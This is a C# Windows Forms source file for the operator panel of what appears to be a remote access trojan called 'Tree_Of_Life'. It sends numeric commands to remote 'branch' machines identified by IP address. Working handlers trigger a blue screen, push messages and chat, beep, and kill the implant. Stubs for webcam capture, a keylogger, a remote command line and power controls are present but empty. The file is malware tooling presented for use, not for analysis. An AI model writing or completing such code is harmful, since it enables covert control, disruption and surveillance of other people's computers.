using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace Tree_Of_Life
{
    public partial class BranchControls : Form
    {
        private enum cmds
        {
            Message = 1, Beep = 2, BlueScreen = 3, Shutdown = 4, Ping = 5, FileExplorer = 6, CMD = 7,
            Camera = 8, RDP = 9, Kill = 10, Restart = 11, Chat = 12, UndoBS = 13
        }

        private Branch branch;
        private string ip;
        private int click = 0;
        private bool CMDStarted;

        public BranchControls(string ip, Branch branch)
        {
            InitializeComponent();
            this.Text = "Controls - " + ip;
            this.branch = branch;
            this.ip = ip;
        }

        /*
         * Communications Tab
         */
        private void Send_Click(object sender, EventArgs e)
        {
            //branch.Send(SendMsgBox.Text);
            
            if(click == 0)
            {
                SendMsgBox.Visible = true;
                Send.Text = "Send";
                branch.SendCommand((int)cmds.Message);
                click++;
            }else if(click == 1)
            {
                string msg = SendMsgBox.Text;
                branch.Write(msg);
                click = 0;
                Send.Text = "Start Message Sender";
                SendMsgBox.Text = "";
                SendMsgBox.Visible = false;
            }
            else
            {
                click = 0;
                MessageBox.Show("Try To Start Message Sender Again");
            }
            
        }
        private void StartChat_Click(object sender, EventArgs e)
        {
            Thread chat = null;
            if(click == 0)
            {
                branch.SendCommand((int)cmds.Chat);
                ChatInput.ReadOnly = false;
                this.StartChat.Text = "End Chat";
                click++;
            }else if(click == 1)
            {
                MessageBox.Show(click.ToString());
                branch.Write("Bye");
                ChatInput.ReadOnly = true;
                ChatOutput.Text = "";
                click = 0;
            }
            else
            {
                click = 0;
                MessageBox.Show("Try To Start Chat Again");
            }
        }
        private void ChatInput_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Enter)
            {
                string msg = ChatInput.Text;
                branch.Write(msg);
            }
        }
        private void StartChatting()
        {
            for(; ; )
            {
                string text = branch.Read();
                Append(text);
            }
        }

        private delegate void ChatAppend(string msg);
        private void Append(string msg)
        {
            if(ChatOutput.InvokeRequired) { Invoke(new ChatAppend(Append), new object[] { msg }); }
            else { ChatOutput.AppendText(ip + ": " + msg + "\n"); }
        }

        private void Beep_Click(object sender, EventArgs e)
        {
            if(String.IsNullOrEmpty(FrequencyBox.Text) || String.IsNullOrEmpty(DurationBox.Text)) { branch.SendCommand((int)cmds.Beep); }
            else if(!String.IsNullOrEmpty(FrequencyBox.Text) && !String.IsNullOrEmpty(DurationBox.Text))
            {
                string data = FrequencyBox.Text + "," + DurationBox.Text;
                branch.SendCommand((int)cmds.Beep);
                Thread.Sleep(500);
                branch.Write(data);
            }else{ MessageBox.Show("Something Went Wrong"); }
        }
        private void TestBeep_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(FrequencyBox.Text) || String.IsNullOrEmpty(DurationBox.Text)){ Console.Beep(); }
            else if (!String.IsNullOrEmpty(FrequencyBox.Text) && !String.IsNullOrEmpty(DurationBox.Text)) { Console.Beep(int.Parse(FrequencyBox.Text), int.Parse(DurationBox.Text)); }
            else{ MessageBox.Show("Something Went Wrong"); }
        }

        private void BlueScreen_Click(object sender, EventArgs e)
        {
            branch.SendCommand((int)cmds.BlueScreen);
        }

        /*
         * Random Tab
         */

        /*
         * Computer Properties Tab
         */

        /*
         * Monitoring Tab
         */
        private void CMDInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (!CMDStarted) { }
            else
            {

            }
        }
        private void StartCMD_Click(object sender, EventArgs e)
        {
            if(click == 0)
            {
                CMDInput.ReadOnly = false;
                StartCMD.Text = "Stop Command Line";
                CMDStarted = true;
                click++;
            }
            else if(click == 1)
            {
                CMDInput.ReadOnly = true;
                StartCMD.Text = "Start Command Line";
                CMDStarted = false;
                click = 0;
            }
            else
            {
                click = 0;
                MessageBox.Show("Try To Start Command Line");
            }
        }
        private void StartWebcam_Click(object sender, EventArgs e)
        {
            if(click == 0)
            {
                StartWebcam.Text = "Stop Webcam Capture";
                click++;
            }
            else if(click == 1)
            {
                StartWebcam.Text = "Start Webcam Capture";
                click = 0;
            }
            else
            {
                click = 0;
                MessageBox.Show("Try To Start Webcam Capture Again");
            }
        }
        private void StartKeylogger_Click(object sender, EventArgs e)
        {

        }

        /*
         * Power Tab
         */
        private void shutdown_Click(object sender, EventArgs e)
        {

        }
        private void Restart_Click(object sender, EventArgs e)
        {

        }
        private void LogOff_Click(object sender, EventArgs e)
        {

        }
        private void Lock_Click(object sender, EventArgs e)
        {

        }
        private void Sleep_Click(object sender, EventArgs e)
        {

        }
        private void KillBranch_Click(object sender, EventArgs e)
        {
            branch.SendCommand((int)cmds.Kill);
            branch.online = false;
            this.Close();
        }
        private void UndoBlueScreen_Click(object sender, EventArgs e)
        {
            branch.SendCommand((int)cmds.UndoBS);
        }

        /*
         * Security Tab
         */

        /*
        private Branch GetBranch(string ip)
        {
            Branch branch = null;
            foreach (Branch b in branches)
            {
                if (b.ip1.Equals(ip))
                {
                    branch = b;
                }
            }
            return branch;
        }
         */
    }
}
